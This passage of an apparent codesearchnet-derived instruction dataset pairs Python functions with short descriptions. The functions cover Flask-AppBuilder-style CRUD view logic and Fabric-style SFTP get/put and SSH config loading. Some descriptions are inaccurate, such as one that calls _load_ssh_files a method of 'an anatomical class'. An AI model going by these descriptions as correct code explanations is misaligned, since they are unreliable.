self.add_fieldsets:\n                self.add_columns = self.add_columns + list(\n                    fieldset_item[1].get(\"fields\")\n                )\n        else:\n            if not self.add_columns:\n                self.add_columns = [\n                    x for x in list_cols if x not in self.add_exclude_columns\n                ]\n        if self.edit_fieldsets:\n            self.edit_columns = []\n            for fieldset_item in self.edit_fieldsets:\n                self.edit_columns = self.edit_columns + list(\n                    fieldset_item[1].get(\"fields\")\n                )\n        else:\n            if not self.edit_columns:\n                self.edit_columns = [\n                    x for x in list_cols if x not in self.edit_exclude_columns\n                ]", "response": "Initialize base properties of the base CRUD view."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_related_views_widgets(\n        self, item, orders=None, pages=None, page_sizes=None, widgets=None, **args\n    ):\n        \"\"\"\n            :return:\n                Returns a dict with 'related_views' key with a list of\n                Model View widgets\n        \"\"\"\n        widgets = widgets or {}\n        widgets[\"related_views\"] = []\n        for view in self._related_views:\n            if orders.get(view.__class__.__name__):\n                order_column, order_direction = orders.get(view.__class__.__name__)\n            else:\n                order_column, order_direction = \"\", \"\"\n            widgets[\"related_views\"].append(\n                self._get_related_view_widget(\n                    item,\n                    view,\n                    order_column,\n                    order_direction,\n                    page=pages.get(view.__class__.__name__),\n                    page_size=page_sizes.get(view.__class__.__name__),\n                )\n            )\n        return widgets", "response": "Returns a dict with related_views key with a list of Model View widgets"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_list_widget(\n        self,\n        filters,\n        actions=None,\n        order_column=\"\",\n        order_direction=\"\",\n        page=None,\n        page_size=None,\n        widgets=None,\n        **args\n    ):\n\n        \"\"\" get joined base filter and current active filter for query \"\"\"\n        widgets = widgets or {}\n        actions = actions or self.actions\n        page_size = page_size or self.page_size\n        if not order_column and self.base_order:\n            order_column, order_direction = self.base_order\n        joined_filters = filters.get_joined_filters(self._base_filters)\n        count, lst = self.datamodel.query(\n            joined_filters,\n            order_column,\n            order_direction,\n            page=page,\n            page_size=page_size,\n        )\n        pks = self.datamodel.get_keys(lst)\n\n        # serialize composite pks\n        pks = [self._serialize_pk_if_composite(pk) for pk in pks]\n\n        widgets[\"list\"] = self.list_widget(\n            label_columns=self.label_columns,\n            include_columns=self.list_columns,\n            value_columns=self.datamodel.get_values(lst, self.list_columns),\n            order_columns=self.order_columns,\n            formatters_columns=self.formatters_columns,\n            page=page,\n            page_size=page_size,\n            count=count,\n            pks=pks,\n            actions=actions,\n            filters=filters,\n            modelview_name=self.__class__.__name__,\n        )\n        return widgets", "response": "get list widget for this object"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nlists function logic, override to implement different logic returns list and search widget", "response": "def _list(self):\n        \"\"\"\n            list function logic, override to implement different logic\n            returns list and search widget\n        \"\"\"\n        if get_order_args().get(self.__class__.__name__):\n            order_column, order_direction = get_order_args().get(\n                self.__class__.__name__\n            )\n        else:\n            order_column, order_direction = \"\", \"\"\n        page = get_page_args().get(self.__class__.__name__)\n        page_size = get_page_size_args().get(self.__class__.__name__)\n        get_filter_args(self._filters)\n        widgets = self._get_list_widget(\n            filters=self._filters,\n            order_column=order_column,\n            order_direction=order_direction,\n            page=page,\n            page_size=page_size,\n        )\n        form = self.search_form.refresh()\n        self.update_redirect()\n        return self._get_search_widget(form=form, widgets=widgets)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _show(self, pk):\n        pages = get_page_args()\n        page_sizes = get_page_size_args()\n        orders = get_order_args()\n\n        item = self.datamodel.get(pk, self._base_filters)\n        if not item:\n            abort(404)\n        widgets = self._get_show_widget(pk, item)\n        self.update_redirect()\n        return self._get_related_views_widgets(\n            item, orders=orders, pages=pages, page_sizes=page_sizes, widgets=widgets\n        )", "response": "show function logic override to implement different logic\n            returns show and related list widget\n       "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd function logic override to implement different logic Add function logic return add widget or None", "response": "def _add(self):\n        \"\"\"\n            Add function logic, override to implement different logic\n            returns add widget or None\n        \"\"\"\n        is_valid_form = True\n        get_filter_args(self._filters)\n        exclude_cols = self._filters.get_relation_cols()\n        form = self.add_form.refresh()\n\n        if request.method == \"POST\":\n            self._fill_form_exclude_cols(exclude_cols, form)\n            if form.validate():\n                self.process_form(form, True)\n                item = self.datamodel.obj()\n                form.populate_obj(item)\n\n                try:\n                    self.pre_add(item)\n                except Exception as e:\n                    flash(str(e), \"danger\")\n                else:\n                    if self.datamodel.add(item):\n                        self.post_add(item)\n                    flash(*self.datamodel.message)\n                finally:\n                    return None\n            else:\n                is_valid_form = False\n        if is_valid_form:\n            self.update_redirect()\n        return self._get_add_widget(form=form, exclude_cols=exclude_cols)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nediting function logic override to implement different logic returns Edit widget and related list or None", "response": "def _edit(self, pk):\n        \"\"\"\n            Edit function logic, override to implement different logic\n            returns Edit widget and related list or None\n        \"\"\"\n        is_valid_form = True\n        pages = get_page_args()\n        page_sizes = get_page_size_args()\n        orders = get_order_args()\n        get_filter_args(self._filters)\n        exclude_cols = self._filters.get_relation_cols()\n\n        item = self.datamodel.get(pk, self._base_filters)\n        if not item:\n            abort(404)\n        # convert pk to correct type, if pk is non string type.\n        pk = self.datamodel.get_pk_value(item)\n\n        if request.method == \"POST\":\n            form = self.edit_form.refresh(request.form)\n            # fill the form with the suppressed cols, generated from exclude_cols\n            self._fill_form_exclude_cols(exclude_cols, form)\n            # trick to pass unique validation\n            form._id = pk\n            if form.validate():\n                self.process_form(form, False)\n                form.populate_obj(item)\n                try:\n                    self.pre_update(item)\n                except Exception as e:\n                    flash(str(e), \"danger\")\n                else:\n                    if self.datamodel.edit(item):\n                        self.post_update(item)\n                    flash(*self.datamodel.message)\n                finally:\n                    return None\n            else:\n                is_valid_form = False\n        else:\n            # Only force form refresh for select cascade events\n            form = self.edit_form.refresh(obj=item)\n            # Perform additional actions to pre-fill the edit form.\n            self.prefill_form(form, pk)\n\n        widgets = self._get_edit_widget(form=form, exclude_cols=exclude_cols)\n        widgets = self._get_related_views_widgets(\n            item,\n            filters={},\n            orders=orders,\n            pages=pages,\n            page_sizes=page_sizes,\n            widgets=widgets,\n        )\n        if is_valid_form:\n            self.update_redirect()\n        return widgets"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _delete(self, pk):\n        item = self.datamodel.get(pk, self._base_filters)\n        if not item:\n            abort(404)\n        try:\n            self.pre_delete(item)\n        except Exception as e:\n            flash(str(e), \"danger\")\n        else:\n            if self.datamodel.delete(item):\n                self.post_delete(item)\n            flash(*self.datamodel.message)\n            self.update_redirect()", "response": "Delete function logic override to implement different logic\n            deletes the record with primary key pk"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _fill_form_exclude_cols(self, exclude_cols, form):\n        for filter_key in exclude_cols:\n            filter_value = self._filters.get_filter_value(filter_key)\n            rel_obj = self.datamodel.get_related_obj(filter_key, filter_value)\n            if hasattr(form, filter_key):\n                field = getattr(form, filter_key)\n                field.data = rel_obj", "response": "Fill the form with the suppressed cols generated from exclude_cols"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndownloads a file from the remote system to the local filesystem.", "response": "def get(self, remote, local=None, preserve_mode=True):\n        \"\"\"\n        Download a file from the current connection to the local filesystem.\n\n        :param str remote:\n            Remote file to download.\n\n            May be absolute, or relative to the remote working directory.\n\n            .. note::\n                Most SFTP servers set the remote working directory to the\n                connecting user's home directory, and (unlike most shells) do\n                *not* expand tildes (``~``).\n\n                For example, instead of saying ``get(\"~/tmp/archive.tgz\")``,\n                say ``get(\"tmp/archive.tgz\")``.\n\n        :param local:\n            Local path to store downloaded file in, or a file-like object.\n\n            **If None or another 'falsey'/empty value is given** (the default),\n            the remote file is downloaded to the current working directory (as\n            seen by `os.getcwd`) using its remote filename.\n\n            **If a string is given**, it should be a path to a local directory\n            or file and is subject to similar behavior as that seen by common\n            Unix utilities or OpenSSH's ``sftp`` or ``scp`` tools.\n\n            For example, if the local path is a directory, the remote path's\n            base filename will be added onto it (so ``get('foo/bar/file.txt',\n            '/tmp/')`` would result in creation or overwriting of\n            ``/tmp/file.txt``).\n\n            .. note::\n                When dealing with nonexistent file paths, normal Python file\n                handling concerns come into play - for example, a ``local``\n                path containing non-leaf directories which do not exist, will\n                typically result in an `OSError`.\n\n            **If a file-like object is given**, the contents of the remote file\n            are simply written into it.\n\n        :param bool preserve_mode:\n            Whether to `os.chmod` the local file so it matches the remote\n            file's mode (default: ``True``).\n\n        :returns: A `.Result` object.\n\n        .. versionadded:: 2.0\n        \"\"\"\n        # TODO: how does this API change if we want to implement\n        # remote-to-remote file transfer? (Is that even realistic?)\n        # TODO: handle v1's string interpolation bits, especially the default\n        # one, or at least think about how that would work re: split between\n        # single and multiple server targets.\n        # TODO: callback support\n        # TODO: how best to allow changing the behavior/semantics of\n        # remote/local (e.g. users might want 'safer' behavior that complains\n        # instead of overwriting existing files) - this likely ties into the\n        # \"how to handle recursive/rsync\" and \"how to handle scp\" questions\n\n        # Massage remote path\n        if not remote:\n            raise ValueError(\"Remote path must not be empty!\")\n        orig_remote = remote\n        remote = posixpath.join(\n            self.sftp.getcwd() or self.sftp.normalize(\".\"), remote\n        )\n\n        # Massage local path:\n        # - handle file-ness\n        # - if path, fill with remote name if empty, & make absolute\n        orig_local = local\n        is_file_like = hasattr(local, \"write\") and callable(local.write)\n        if not local:\n            local = posixpath.basename(remote)\n        if not is_file_like:\n            local = os.path.abspath(local)\n\n        # Run Paramiko-level .get() (side-effects only. womp.)\n        # TODO: push some of the path handling into Paramiko; it should be\n        # responsible for dealing with path cleaning etc.\n        # TODO: probably preserve warning message from v1 when overwriting\n        # existing files. Use logging for that obviously.\n        #\n        # If local appears to be a file-like object, use sftp.getfo, not get\n        if is_file_like:\n            self.sftp.getfo(remotepath=remote, fl=local)\n        else:\n            self.sftp.get(remotepath=remote, localpath=local)\n            # Set mode to same as remote end\n            # TODO: Push this down into SFTPClient sometime (requires backwards\n            # incompat release.)\n            if preserve_mode:\n                remote_mode = self.sftp.stat(remote).st_mode\n                mode = stat.S_IMODE(remote_mode)\n                os.chmod(local, mode)\n        # Return something useful\n        return Result(\n            orig_remote=orig_remote,\n            remote=remote,\n            orig_local=orig_local,\n            local=local,\n            connection=self.connection,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef put(self, local, remote=None, preserve_mode=True):\n        if not local:\n            raise ValueError(\"Local path must not be empty!\")\n\n        is_file_like = hasattr(local, \"write\") and callable(local.write)\n\n        # Massage remote path\n        orig_remote = remote\n        if is_file_like:\n            local_base = getattr(local, \"name\", None)\n        else:\n            local_base = os.path.basename(local)\n        if not remote:\n            if is_file_like:\n                raise ValueError(\n                    \"Must give non-empty remote path when local is a file-like object!\"  # noqa\n                )\n            else:\n                remote = local_base\n                debug(\"Massaged empty remote path into {!r}\".format(remote))\n        elif self.is_remote_dir(remote):\n            # non-empty local_base implies a) text file path or b) FLO which\n            # had a non-empty .name attribute. huzzah!\n            if local_base:\n                remote = posixpath.join(remote, local_base)\n            else:\n                if is_file_like:\n                    raise ValueError(\n                        \"Can't put a file-like-object into a directory unless it has a non-empty .name attribute!\"  # noqa\n                    )\n                else:\n                    # TODO: can we ever really end up here? implies we want to\n                    # reorganize all this logic so it has fewer potential holes\n                    raise ValueError(\n                        \"Somehow got an empty local file basename ({!r}) when uploading to a directory ({!r})!\".format(  # noqa\n                            local_base, remote\n                        )\n                    )\n\n        prejoined_remote = remote\n        remote = posixpath.join(\n            self.sftp.getcwd() or self.sftp.normalize(\".\"), remote\n        )\n        if remote != prejoined_remote:\n            msg = \"Massaged relative remote path {!r} into {!r}\"\n            debug(msg.format(prejoined_remote, remote))\n\n        # Massage local path\n        orig_local = local\n        if not is_file_like:\n            local = os.path.abspath(local)\n            if local != orig_local:\n                debug(\n                    \"Massaged relative local path {!r} into {!r}\".format(\n                        orig_local, local\n                    )\n                )  # noqa\n\n        # Run Paramiko-level .put() (side-effects only. womp.)\n        # TODO: push some of the path handling into Paramiko; it should be\n        # responsible for dealing with path cleaning etc.\n        # TODO: probably preserve warning message from v1 when overwriting\n        # existing files. Use logging for that obviously.\n        #\n        # If local appears to be a file-like object, use sftp.putfo, not put\n        if is_file_like:\n            msg = \"Uploading file-like object {!r} to {!r}\"\n            debug(msg.format(local, remote))\n            pointer = local.tell()\n            try:\n                local.seek(0)\n                self.sftp.putfo(fl=local, remotepath=remote)\n            finally:\n                local.seek(pointer)\n        else:\n            debug(\"Uploading {!r} to {!r}\".format(local, remote))\n            self.sftp.put(localpath=local, remotepath=remote)\n            # Set mode to same as local end\n            # TODO: Push this down into SFTPClient sometime (requires backwards\n            # incompat release.)\n            if preserve_mode:\n                local_mode = os.stat(local).st_mode\n                mode = stat.S_IMODE(local_mode)\n                self.sftp.chmod(remote, mode)\n        # Return something useful\n        return Result(\n            orig_remote=orig_remote,\n            remote=remote,\n            orig_local=orig_local,\n            local=local,\n            connection=self.connection,\n        )", "response": "Uploads a file from the local filesystem to the remote system."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load_ssh_config(self):\n        # Update the runtime SSH config path (assumes enough regular config\n        # levels have been loaded that anyone wanting to transmit this info\n        # from a 'vanilla' Invoke config, has gotten it set.)\n        if self.ssh_config_path:\n            self._runtime_ssh_path = self.ssh_config_path\n        # Load files from disk if we weren't given an explicit SSHConfig in\n        # __init__\n        if not self._given_explicit_object:\n            self._load_ssh_files()", "response": "Load the SSH config files from disk."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _load_ssh_files(self):\n        # TODO: does this want to more closely ape the behavior of\n        # InvokeConfig.load_files? re: having a _found attribute for each that\n        # determines whether to load or skip\n        if self._runtime_ssh_path is not None:\n            path = self._runtime_ssh_path\n            # Manually blow up like open() (_load_ssh_file normally doesn't)\n            if not os.path.exists(path):\n                msg = \"No such file or directory: {!r}\".format(path)\n                raise IOError(errno.ENOENT, msg)\n            self._load_ssh_file(os.path.expanduser(path))\n        elif self.load_ssh_configs:\n            for path in (self._user_ssh_path, self._system_ssh_path):\n                self._load_ssh_file(os.path.expanduser(path))", "response": "Loads the SSH config files for the current instance of an anatomical class."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _load_ssh_file(self, path):\n        if os.path.isfile(path):\n            old_rules = len(self.base_ssh_config._config)\n            with open(path) as fd:\n                self.base_ssh_config.parse(fd)\n            new_rules = len(self.base_ssh_config._config)\n            msg = \"Loaded {} new ssh_config rules from {!r}\"\n            debug(msg.format(new_rules - old_rules, path))\n        else:\n            debug(\"File not found, skipping\")", "response": "Attempts to open and parse an SSH config file at path."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndefaulting configuration values and behavior toggles. Fabric only extends this method in order to make minor adjustments and additions to Invoke's `~invoke.config.Config.global_defaults`; see its documentation for the base values, such as the config subtrees controlling behavior of ``run`` or how ``tasks`` behave. For Fabric-specific modifications and additions to the Invoke-level defaults, see our own config docs at :ref:`default-values`. .. versionadded:: 2.0", "response": "def global_defaults():\n        \"\"\"\n        Default configuration values and behavior toggles.\n\n        Fabric only extends this method in order to make minor adjustments and\n        additions to Invoke's `~invoke.config.Config.global_defaults`; see its\n        documentation for the base values, such as the config subtrees\n        controlling behavior of ``run`` or how ``tasks`` behave.\n\n        For Fabric-specific modifications and additions to the Invoke-level\n        defaults, see our own config docs at :ref:`default-values`.\n\n        .. versionadded:: 2.0\n        \"\"\"\n        # TODO: hrm should the run-related things actually be derived from the\n        # runner_class? E.g. Local defines local stuff, Remote defines remote\n        # stuff? Doesn't help with the final config tree tho...\n        # TODO: as to that, this is a core problem, Fabric wants split\n        # local/remote stuff, eg replace_env wants to be False for local and\n        # True remotely; shell wants to differ depending on target (and either\n        # way, does not want to use local interrogation for remote)\n        # TODO: is it worth moving all of our 'new' settings to a discrete\n        # namespace for cleanliness' sake? e.g. ssh.port, ssh.user etc.\n        # It wouldn't actually simplify this code any, but it would make it\n        # easier for users to determine what came from which library/repo.\n        defaults = InvokeConfig.global_defaults()\n        ours = {\n            # New settings\n            \"connect_kwargs\": {},\n            \"forward_agent\": False,\n            \"gateway\": None,\n            \"load_ssh_configs\": True,\n            \"port\": 22,\n            \"run\": {\"replace_env\": True},\n            \"runners\": {\"remote\": Remote},\n            \"ssh_config_path\": None,\n            \"tasks\": {\"collection_name\": \"fabfile\"},\n            # TODO: this becomes an override/extend once Invoke grows execution\n            # timeouts (which should be timeouts.execute)\n            \"timeouts\": {\"connect\": None},\n            \"user\": get_local_user(),\n        }\n        merge_dicts(defaults, ours)\n        return defaults"}
